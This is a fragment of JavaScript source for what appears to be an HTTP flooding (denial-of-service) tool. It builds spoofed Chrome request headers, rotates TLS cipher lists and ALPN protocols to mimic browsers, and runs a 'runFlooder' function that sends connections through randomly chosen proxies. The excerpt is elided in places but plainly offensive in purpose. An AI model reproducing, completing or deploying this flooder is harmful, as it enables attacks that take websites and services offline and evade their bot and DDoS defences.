...
let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 103, httpVersion: "2"},
    ],
    devices: [
        "desktop",
    ],
...
let randomHeaders = headerGenerator.getHeaders();
 ...
 const cplist = [
     ...
     ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", 
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 
 ...
 function runFlooder() {
     var proxyAddr = proxies[Math.floor(Math.floor(Math.random() * proxies.length))];
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         const tlsOptions = {
            ALPNProtocols: ['h2', 'http1.1', 'http%2F1.1', 'http/1.1', 'spdy/3'],
